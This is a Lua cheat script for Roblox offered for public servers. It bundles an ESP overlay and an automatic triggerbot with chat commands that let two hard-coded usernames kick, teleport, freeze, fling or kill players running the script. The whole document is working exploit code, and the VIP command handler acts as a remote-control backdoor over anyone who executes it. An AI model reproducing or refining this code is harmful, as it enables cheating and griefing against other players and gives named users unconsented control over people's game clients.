-- ðŸ”´ Fully Fixed Roblox Script: ESP, Triggerbot, and VIP Commands (Public-Server Ready)

-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- Settings
local VIPUsers = { "misiuperc568", "afasterpl11" }
local BringTargets = {}
local FrozenPlayers = {}
local targetedPlayers = {}
local espObjects = {}
local lastTargetedPlayerName = nil

-- VIP functions
local function teleportToPlayer(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    local myChar = LocalPlayer.Character
    if targetPlayer and targetPlayer.Character and myChar then
        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if targetRoot and myRoot then
            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
        end
    end
end

local function freezeAllPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
            local root = player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Anchored = true
                FrozenPlayers[player.Name] = true
            end
        end
    end
end

local function unfreezeAllPlayers(senderName)
    for name, _ in pairs(FrozenPlayers) do
        if name ~= senderName then
            local player = Players:FindFirstChild(name)
            if player and player.Character then
                local root = player.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.Anchored = false
                end
            end
            FrozenPlayers[name] = nil
        end
    end
end

local function killAllOtherPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name ~= senderName then
            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Health = 0
            end
        end
    end
end

local function flingPlayer(player)
    if player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
            bv.MaxForce = Vector3.new(1e6,1e6,1e6)
            bv.P = 1e5
            bv.Parent = root
            task.delay(0.3, function() bv:Destroy() end)
        end
    end
end

-- ESP functions (robust, works for public servers)
local function addESP(targetPlayer, color)
    if espObjects[targetPlayer] then return end

    local gui = Instance.new("BillboardGui")
    gui.Size = UDim2.new(0,100,0,20)
    gui.StudsOffset = Vector3.new(0,2,0)
    gui.AlwaysOnTop = true
    gui.Parent = game:GetService("CoreGui")

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.TextColor3 = color
    label.TextStrokeTransparency = 0.8
    label.TextStrokeColor3 = Color3.new(0,0,0)
    label.TextScaled = true
    label.Font = Enum.Font.SourceSansBold
    label.Text = targetPlayer.Name
    label.Parent = gui

    espObjects[targetPlayer] = {Gui = gui, Player = targetPlayer}

    -- Attach to head whenever available (character load / respawn safe)
    local conn
    conn = RunService.RenderStepped:Connect(function()
        local char = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
        local head = char and char:FindFirstChild("Head")
        gui.Adornee = head
    end)
    espObjects[targetPlayer].Connection = conn
end

local function removeESP(targetPlayer)
    local data = espObjects[targetPlayer]
    if data then
        if data.Connection then data.Connection:Disconnect() end
        if data.Gui then data.Gui:Destroy() end
        espObjects[targetPlayer] = nil
    end
end

local function getColorForPlayer(player)
    return Color3.fromRGB(255,255,255)
end

-- Smooth bring loop (auto detach once teleported)
RunService.RenderStepped:Connect(function()
    for targetName, _ in pairs(BringTargets) do
        local targetPlayer = Players:FindFirstChild(targetName)
        for _, vipName in ipairs(VIPUsers) do
            local vipPlayer = Players:FindFirstChild(vipName)
            if vipPlayer and vipPlayer.Character and targetPlayer and targetPlayer.Character and targetPlayer ~= vipPlayer then
                local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if vipRoot and targetRoot then
                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25

                    -- âœ… Detach once close enough
                    if (vipRoot.Position - targetRoot.Position).Magnitude < 5 then
                        BringTargets[targetName] = nil
                    end
                end
            end
        end
    end
end)

-- Triggerbot (unchanged)
local TriggerBot = {Enabled=false, Connections={}, BlacklistCache={}}
TriggerBot.Settings={Keybind=Enum.KeyCode.Q, Prediction=0.01, Blacklisted={"Knife"}}
for _,itemName in ipairs(TriggerBot.Settings.Blacklisted) do
    TriggerBot.BlacklistCache[itemName:lower()]=true
end
local function IsToolBlacklisted(tool) return tool and TriggerBot.BlacklistCache[tool.Name:lower()] end
local function IsValidTarget(player)
    if not player or player == LocalPlayer then return false end
    local char = player.Character
    if not char then return false end
    local be = char:FindFirstChild("BodyEffects")
    if be then
        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
        if ko and ko.Value then return false end
    end
    local hum = char:FindFirstChild("Humanoid")
    if hum and hum.Health <= 0 then return false end
    return true
end
local function GetTargetFromMouse()
    local target = Mouse.Target
    if not target then return nil end
    for _,player in ipairs(Players:GetPlayers()) do
        if player.Character and target:IsDescendantOf(player.Character) and IsValidTarget(player) then
            return player, target
        end
    end
    return nil
end
local function GetEquippedTool()
    local char = LocalPlayer.Character
    if not char then return nil end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and not IsToolBlacklisted(tool) then return tool end
    end
    return nil
end
local function Execute()
    if not TriggerBot.Enabled then return end
    local targetPlayer,_ = GetTargetFromMouse()
    if not targetPlayer then return end
    local tool = GetEquippedTool()
    if not tool then return end
    if TriggerBot.Settings.Prediction>0 then task.wait(TriggerBot.Settings.Prediction) end
    tool:Activate()
end
function TriggerBot:Toggle(state)
    if state~=nil then self.Enabled=state else self.Enabled=not self.Enabled end
end
TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.UserInputType==Enum.UserInputType.Keyboard and input.KeyCode==TriggerBot.Settings.Keybind then
        TriggerBot:Toggle()
    end
end)
TriggerBot.Connections.RenderStepped = RunService.RenderStepped:Connect(Execute)
getgenv().DisableTriggerBot=function()
    for _,conn in pairs(TriggerBot.Connections) do conn:Disconnect() end
    TriggerBot.Enabled=false
end

-- Chat commands (robust for public servers)
local function onMessage(sender, msg)
    local vip=false
    for _,v in ipairs(VIPUsers) do
        if sender:lower()==v:lower() then vip=true break end
    end
    if not vip then return end

    local args=msg:split(" ")
    local cmd=args[1]:lower()

    if cmd==".h" then
        local targetName=args[2]
        if targetName then
            -- Case-insensitive player lookup
            for _,p in ipairs(Players:GetPlayers()) do
                if p.Name:lower()==targetName:lower() then
                    if not targetedPlayers[p.Name] then
                        targetedPlayers[p.Name]=true
                        lastTargetedPlayerName=p.Name
                        addESP(p,getColorForPlayer(p))
                    end
                end
            end
        end
    elseif cmd==".j" then
        for name,_ in pairs(targetedPlayers) do
            local target=Players:FindFirstChild(name)
            if target then removeESP(target) end
            targetedPlayers[name]=nil
        end
        lastTargetedPlayerName=nil
    elseif cmd==".k" and LocalPlayer.Name:lower()~=sender:lower() then
        LocalPlayer:Kick("Kicked by VIP")
    elseif cmd==".g" then
        if LocalPlayer.Name~=sender then BringTargets[LocalPlayer.Name]=true end
    elseif cmd==".f" then
        freezeAllPlayers(sender)
    elseif cmd==".u" then
        unfreezeAllPlayers(sender)
    elseif cmd==".tp" and args[2] then
        if LocalPlayer.Name~=sender then teleportToPlayer(args[2]) end
    elseif cmd==".fling" then
        for _,p in ipairs(Players:GetPlayers()) do
            if p.Name~=sender then flingPlayer(p) end
        end
    elseif cmd==".r" then
        if LocalPlayer.Name~=sender then killAllOtherPlayers(sender) end
    end
end

-- Chat hook (works for both old and new chat systems)
local function hookPlayer(plr)
    -- Old chat system
    plr.Chatted:Connect(function(msg)
        onMessage(plr.Name, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    hookPlayer(p)
end
Players.PlayerAdded:Connect(hookPlayer)

-- New chat system (TextChatService) support
local TextChatService = game:GetService("TextChatService")
if TextChatService then
    local Channels = TextChatService:FindFirstChild("TextChannels")
    if Channels and Channels:FindFirstChild("RBXGeneral") then
        Channels.RBXGeneral.OnIncomingMessage = function(message)
            local props = message.TextSource
            if props then
                local speaker = Players:GetPlayerByUserId(props.UserId)
                if speaker then
                    onMessage(speaker.Name, message.Text)
                end
            end
        end
    end
end

-- Clean up ESP when players leave
Players.PlayerRemoving:Connect(function(plr)
    if targetedPlayers[plr.Name] then targetedPlayers[plr.Name]=nil end
    removeESP(plr)
end)
